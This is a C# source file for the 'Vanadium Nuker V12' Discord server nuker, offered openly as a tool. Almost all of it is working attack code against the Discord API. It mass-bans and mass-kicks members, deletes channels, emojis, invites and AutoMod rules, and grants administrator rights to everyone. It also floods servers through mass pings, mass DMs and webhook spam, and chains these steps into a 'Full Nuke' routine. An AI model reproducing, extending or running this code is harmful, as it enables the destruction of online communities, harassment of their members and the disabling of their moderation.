/*
 * ============================================
 * Vanadium Nuker V12 - Discord Server Nuker
 * ============================================
 * 
 * Copyright (c) 2026 RussianHarvey & Tobakk
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 * 
 * ============================================
 * Discord: @russianharvey | @_ux8
 * GitHub: https://github.com/N0tThunder
 * Version: 2.0.0-ULTRA
 * ============================================
 */
#nullable disable
using System.Text.Json;
using System.Threading;
using VanadiumStrike.Config;

namespace VanadiumStrike.Core;

public class VanadiumEngine : IDisposable
{
    private readonly RequestHandler _req;
    private readonly ulong _guildId;
    
    public VanadiumEngine(string token, ulong guildId)
    {
        _req = new RequestHandler(token);
        _guildId = guildId;
    }
    
    // اختبار الاتصال
    public async Task<bool> TestConnectionAsync()
    {
        var guild = await _req.GetJsonAsync($"guilds/{_guildId}");
        if (guild == null)
        {
            ConsoleHelper.PrintError("Connection test FAILED: Invalid token or guild ID");
            return false;
        }
        ConsoleHelper.PrintSuccess("Connection test PASSED");
        return true;
    }
    
    // 01 - Ban All Members
    public async Task BanAllMembersAsync(ulong botId)
    {
        var members = await _req.GetJsonAsync($"guilds/{_guildId}/members?limit=1000");
        if (members == null) return;
        var userIds = members.Value.EnumerateArray()
            .Select(m => GetId(m.GetProperty("user").GetProperty("id")))
            .Where(id => id != botId).ToList();

        await ParallelForEachAsync(userIds, async uid =>
        {
            var resp = await _req.SendAsync(HttpMethod.Put, $"guilds/{_guildId}/bans/{uid}");
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Banned {uid}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 02 - Kick All Members
    public async Task KickAllMembersAsync(ulong botId)
    {
        var members = await _req.GetJsonAsync($"guilds/{_guildId}/members?limit=1000");
        if (members == null) return;
        var userIds = members.Value.EnumerateArray()
            .Select(m => GetId(m.GetProperty("user").GetProperty("id")))
            .Where(id => id != botId).ToList();

        await ParallelForEachAsync(userIds, async uid =>
        {
            var resp = await _req.SendAsync(HttpMethod.Delete, $"guilds/{_guildId}/members/{uid}");
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Kicked {uid}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 03 - Unban All Members
    public async Task UnbanAllAsync()
    {
        var bans = await _req.GetJsonAsync($"guilds/{_guildId}/bans");
        if (bans == null) return;
        var userIds = bans.Value.EnumerateArray()
            .Select(b => GetId(b.GetProperty("user").GetProperty("id"))).ToList();
        await ParallelForEachAsync(userIds, async uid =>
        {
            var resp = await _req.SendAsync(HttpMethod.Delete, $"guilds/{_guildId}/bans/{uid}");
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Unbanned {uid}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 04,05,06 - Create Channels
    public async Task CreateChannelsAsync(int type, string name, int amount)
    {
        await ParallelForEachAsync(Enumerable.Range(0, amount), async _ =>
        {
            var data = new { name, type };
            var resp = await _req.SendAsync(HttpMethod.Post, $"guilds/{_guildId}/channels", data);
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Created {name}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 07 - Delete All Channels
    public async Task DeleteAllChannelsAsync()
    {
        var channels = await _req.GetJsonAsync($"guilds/{_guildId}/channels");
        if (channels == null)
        {
            ConsoleHelper.PrintError("Failed to load channels. Check bot permissions and guild access.");
            return;
        }

        var channelIds = channels.Value.EnumerateArray()
            .Select(c => GetId(c.GetProperty("id"))).ToList();

        if (!channelIds.Any())
        {
            ConsoleHelper.PrintWarning("No channels found to delete.");
            return;
        }

        await ParallelForEachAsync(channelIds, async cid =>
        {
            var resp = await _req.SendAsync(HttpMethod.Delete, $"channels/{cid}");
            if (resp?.IsSuccessStatusCode == true)
            {
                ConsoleHelper.PrintSuccess($"Deleted channel {cid}");
            }
            else
            {
                ConsoleHelper.PrintError($"Failed to delete channel {cid}. Status: {resp?.StatusCode}");
            }
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 08 - Create New Roles
    public async Task CreateRolesAsync(string name, int amount)
    {
        var rand = new Random();
        await ParallelForEachAsync(Enumerable.Range(0, amount), async _ =>
        {
            var data = new { name, color = rand.Next(0xFFFFFF) };
            var resp = await _req.SendAsync(HttpMethod.Post, $"guilds/{_guildId}/roles", data);
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Created {name}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }

    private async Task ParallelForEachAsync<T>(IEnumerable<T> items, Func<T, Task> action, int maxConcurrency = 16)
    {
        using var semaphore = new SemaphoreSlim(maxConcurrency);
        var tasks = items.Select(async item =>
        {
            await semaphore.WaitAsync();
            try
            {
                await action(item);
            }
            finally
            {
                semaphore.Release();
            }
        });
        await Task.WhenAll(tasks);
    }

    public async Task<ulong> GetCurrentUserIdAsync()
    {
        var me = await _req.GetJsonAsync("users/@me");
        if (me == null) return 0;
        return GetId(me.Value.GetProperty("id"));
    }

    public async Task ServerAboutAsync()
    {
        var guild = await _req.GetJsonAsync($"guilds/{_guildId}?with_counts=true");
        if (guild == null)
        {
            ConsoleHelper.PrintError("Failed to fetch guild info. Check permissions.");
            return;
        }

        var channels = await _req.GetJsonAsync($"guilds/{_guildId}/channels");
        var roles = await _req.GetJsonAsync($"guilds/{_guildId}/roles");

        var name = guild.Value.GetProperty("name").GetString() ?? "Unknown";
        var id = guild.Value.GetProperty("id").GetString() ?? _guildId.ToString();
        var owner = guild.Value.TryGetProperty("owner_id", out var ownerProp) ? ownerProp.GetString() : "Unknown";
        var memberCount = GetInt(guild.Value.GetProperty("approximate_member_count"));
        var channelCount = channels.HasValue ? channels.Value.EnumerateArray().Count() : 0;
        var roleCount = roles.HasValue ? roles.Value.EnumerateArray().Count() : 0;
        var createdAt = GetDateTimeFromSnowflake(id);

        Console.Clear();
        ConsoleHelper.PrintBanner();
        Console.WriteLine($@"
{ColorConfig.Red}  ┌──{ColorConfig.White}(VANADIUM@TERMINAL{ColorConfig.Red})──[{ColorConfig.White}~/Server-Information{ColorConfig.Red}]
{ColorConfig.Red}  │
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Server Name      : {ColorConfig.White}{name}
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Server ID        : {ColorConfig.White}{id}
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Server Owner     : {ColorConfig.White}{owner}
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Created At       : {ColorConfig.White}{createdAt:yyyy-MM-dd HH:mm:ss}
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Member Count     : {ColorConfig.White}{memberCount}
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Channel Count    : {ColorConfig.White}{channelCount}
{ColorConfig.Red}  ├─╼ {ColorConfig.Red}Role Count       : {ColorConfig.White}{roleCount}
{ColorConfig.Red}  │
{ColorConfig.Red}  └─╼ {ColorConfig.Yellow}Returning to menu...
{ColorConfig.Reset}");
        await Task.Delay(1800);
        Console.Clear();
    }

    // 10 - Mass Ping
    public async Task MassPingAsync(string msg, int amount)
    {
        var channels = await _req.GetJsonAsync($"guilds/{_guildId}/channels");
        if (channels == null) return;
        var textChannels = channels.Value.EnumerateArray()
            .Where(c => GetInt(c.GetProperty("type")) == 0)
            .Select(c => GetId(c.GetProperty("id"))).ToList();
        if (!textChannels.Any()) return;
        var rand = Random.Shared;
        await ParallelForEachAsync(Enumerable.Range(0, amount), async _ =>
        {
            var cid = textChannels[rand.Next(textChannels.Count)];
            var resp = await _req.SendAsync(HttpMethod.Post, $"channels/{cid}/messages", new { content = msg });
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Pinged {cid}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 11 - Mass DM
    public async Task MassDMAsync(string msg)
    {
        var members = await _req.GetJsonAsync($"guilds/{_guildId}/members?limit=1000");
        if (members == null) return;
        var userIds = members.Value.EnumerateArray()
            .Select(m => GetId(m.GetProperty("user").GetProperty("id"))).ToList();
        await ParallelForEachAsync(userIds, async uid =>
        {
            var dm = await _req.SendAsync(HttpMethod.Post, "users/@me/channels", new { recipient_id = uid });
            if (dm?.IsSuccessStatusCode == true)
            {
                var dmJson = JsonSerializer.Deserialize<JsonElement>(await dm.Content.ReadAsStringAsync());
                var cid = GetId(dmJson.GetProperty("id"));
                await _req.SendAsync(HttpMethod.Post, $"channels/{cid}/messages", new { content = msg });
                ConsoleHelper.PrintSuccess($"DM sent to {uid}");
            }
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 12 - Rename All Channels
    public async Task RenameAllChannelsAsync(string newName)
    {
        var channels = await _req.GetJsonAsync($"guilds/{_guildId}/channels");
        if (channels == null) return;
        var channelIds = channels.Value.EnumerateArray()
            .Select(c => GetId(c.GetProperty("id"))).ToList();
        await ParallelForEachAsync(channelIds, async cid =>
        {
            var resp = await _req.SendAsync(HttpMethod.Patch, $"channels/{cid}", new { name = newName });
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Renamed {cid}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 13 - Give Admin to All
    public async Task GiveAdminAsync()
    {
        var roles = await _req.GetJsonAsync($"guilds/{_guildId}/roles");
        if (roles == null) return;
        var firstRole = roles.Value.EnumerateArray().First();
        var rid = GetId(firstRole.GetProperty("id"));
        var resp = await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}/roles/{rid}", new { permissions = "8" });
        if (resp?.IsSuccessStatusCode == true)
            ConsoleHelper.PrintSuccess("Admin granted to everyone");
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 14 - Rename All Members
    public async Task RenameAllMembersAsync(string nick)
    {
        var members = await _req.GetJsonAsync($"guilds/{_guildId}/members?limit=1000");
        if (members == null) return;
        var userIds = members.Value.EnumerateArray()
            .Select(m => GetId(m.GetProperty("user").GetProperty("id"))).ToList();
        await ParallelForEachAsync(userIds, async uid =>
        {
            var resp = await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}/members/{uid}", new { nick });
            if (resp?.IsSuccessStatusCode == true)
                ConsoleHelper.PrintSuccess($"Renamed {uid}");
        }, 16);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 15 - Delete All Emojis
    public async Task DeleteEmojisAsync()
    {
        var emojis = await _req.GetJsonAsync($"guilds/{_guildId}/emojis");
        if (emojis == null) return;
        var emojiIds = emojis.Value.EnumerateArray()
            .Select(e => GetId(e.GetProperty("id"))).ToList();
        await ParallelForEachAsync(emojiIds, async eid =>
        {
            await _req.SendAsync(HttpMethod.Delete, $"guilds/{_guildId}/emojis/{eid}");
            ConsoleHelper.PrintSuccess($"Deleted emoji {eid}");
        }, 12);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 16 - Delete All Stickers
    public async Task DeleteStickersAsync()
    {
        var stickers = await _req.GetJsonAsync($"guilds/{_guildId}/stickers");
        if (stickers == null) return;
        var stickerIds = stickers.Value.EnumerateArray()
            .Select(s => GetId(s.GetProperty("id"))).ToList();
        await ParallelForEachAsync(stickerIds, async sid =>
        {
            await _req.SendAsync(HttpMethod.Delete, $"guilds/{_guildId}/stickers/{sid}");
            ConsoleHelper.PrintSuccess($"Deleted sticker {sid}");
        }, 12);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 17 - Delete Vanity URL
    public async Task DeleteVanityAsync()
    {
        await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}/vanity-url", new { code = (string)null });
        ConsoleHelper.PrintSuccess("Vanity URL removed");
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 18 - Webhook Spammer
    public async Task WebhookSpamAsync(string msg, int perWebhook)
    {
        var channels = await _req.GetJsonAsync($"guilds/{_guildId}/channels");
        if (channels == null) return;
        var textChannels = channels.Value.EnumerateArray()
            .Where(c => GetInt(c.GetProperty("type")) == 0)
            .Select(c => GetId(c.GetProperty("id"))).ToList();
        await ParallelForEachAsync(textChannels, async cid =>
        {
            var webhook = await _req.SendAsync(HttpMethod.Post, $"channels/{cid}/webhooks", new { name = "Vanadium" });
            if (webhook?.IsSuccessStatusCode == true)
            {
                using var jsonDoc = JsonDocument.Parse(await webhook.Content.ReadAsStringAsync());var json = jsonDoc.RootElement;
                var url = json.GetProperty("url").GetString();
                var sendTasks = Enumerable.Range(0, perWebhook)
                    .Select(_ => _req.SendAsync(HttpMethod.Post, url.Split("api/")[1], new { content = msg }));
                await Task.WhenAll(sendTasks);
                ConsoleHelper.PrintSuccess($"Webhook spam on channel");
            }
        }, 12);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 19 - Kill Soundboard
    public async Task KillSoundboardAsync()
    {
        var sounds = await _req.GetJsonAsync($"guilds/{_guildId}/soundboard-sounds");
        if (sounds == null) return;
        var soundIds = sounds.Value.GetProperty("items").EnumerateArray()
            .Select(s => GetId(s.GetProperty("id"))).ToList();
        await ParallelForEachAsync(soundIds, async sid =>
        {
            await _req.SendAsync(HttpMethod.Delete, $"guilds/{_guildId}/soundboard-sounds/{sid}");
            ConsoleHelper.PrintSuccess($"Deleted sound {sid}");
        }, 12);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 20 - Delete All Invites
    public async Task DeleteInvitesAsync()
    {
        var invites = await _req.GetJsonAsync($"guilds/{_guildId}/invites");
        if (invites == null) return;
        var codes = invites.Value.EnumerateArray()
            .Select(i => i.GetProperty("code").GetString()).ToList();
        await ParallelForEachAsync(codes, async code =>
        {
            if (code == null) return;
            await _req.SendAsync(HttpMethod.Delete, $"invites/{code}");
            ConsoleHelper.PrintSuccess($"Deleted invite {code}");
        }, 12);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 21 - Change Server Name
    public async Task ChangeServerNameAsync(string name)
{
    var resp = await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}", new { name });
    if (resp?.IsSuccessStatusCode == true)
    {
        ConsoleHelper.PrintSuccess($"Server name changed to {name}");
    }
    else
    {
        var error = await resp?.Content.ReadAsStringAsync();
        ConsoleHelper.PrintError($"Failed to change server name: {error}");
    }
    
    await Task.Delay(500);
    Console.Clear();
}
    
    // 22 - Pause All Invites
    public async Task PauseInvitesAsync()
    {
        await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}", new { features = new[] { "INVITES_DISABLED" } });
        ConsoleHelper.PrintSuccess("Invites paused");
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 23 - Disable Auto-Mod
    public async Task DisableAutoModAsync()
    {
        var rules = await _req.GetJsonAsync($"guilds/{_guildId}/auto-moderation/rules");
        if (rules == null) return;
        var ruleIds = rules.Value.EnumerateArray()
            .Select(r => GetId(r.GetProperty("id"))).ToList();
        await ParallelForEachAsync(ruleIds, async rid =>
        {
            await _req.SendAsync(HttpMethod.Delete, $"guilds/{_guildId}/auto-moderation/rules/{rid}");
            ConsoleHelper.PrintSuccess($"Deleted AutoMod rule {rid}");
        }, 12);
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 24 - Disable Community
    public async Task DisableCommunityAsync()
    {
        await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}", new { features = Array.Empty<string>() });
        ConsoleHelper.PrintSuccess("Community disabled");
        
        await Task.Delay(500);
        Console.Clear();
    }
    
    // 25 - Enable Community
    public async Task EnableCommunityAsync()
{
    var resp = await _req.SendAsync(HttpMethod.Patch, $"guilds/{_guildId}", new { features = new[] { "COMMUNITY" } });
    if (resp?.IsSuccessStatusCode == true)
    {
        ConsoleHelper.PrintSuccess("Community enabled");
    }
    else
    {
        var error = await resp?.Content.ReadAsStringAsync();
        ConsoleHelper.PrintError($"Failed to enable community: {error}");
    }
    
    await Task.Delay(500);
    Console.Clear();
}
    
    // 0x90 - Full Nuke
    public async Task NukeAsync(string chName, string spam)
    {
        ConsoleHelper.PrintWarning("[1/4] BANNING ALL MEMBERS...");
        await BanAllMembersAsync(0);
        ConsoleHelper.PrintWarning("[2/4] DELETING ALL CHANNELS...");
        await DeleteAllChannelsAsync();
        ConsoleHelper.PrintWarning("[3/4] CREATING 200 CHANNELS...");
        await CreateChannelsAsync(0, chName, 200);
        await Task.Delay(2000);
        ConsoleHelper.PrintWarning("[4/4] MASS PING 2000 MESSAGES...");
        await MassPingAsync(spam, 2000);
        ConsoleHelper.PrintSuccess("NUKE COMPLETED!");
        
        await Task.Delay(500);
        Console.Clear();
    }

    private static ulong GetId(JsonElement element)
    {
        return element.ValueKind switch
        {
            JsonValueKind.Number => element.GetUInt64(),
            JsonValueKind.String when ulong.TryParse(element.GetString(), out var value) => value,
            _ => 0UL,
        };
    }

    private static int GetInt(JsonElement element)
    {
        return element.ValueKind switch
        {
            JsonValueKind.Number => element.GetInt32(),
            JsonValueKind.String when int.TryParse(element.GetString(), out var value) => value,
            _ => 0,
        };
    }
    
    private static DateTime GetDateTimeFromSnowflake(string snowflake)
    {
        if (!ulong.TryParse(snowflake, out var id))
            return DateTime.MinValue;

        const long discordEpoch = 1420070400000;
        var timestamp = (long)((id >> 22) + (ulong)discordEpoch);
        return DateTimeOffset.FromUnixTimeMilliseconds(timestamp).UtcDateTime;
    }

    public void Dispose() => _req.Dispose();
}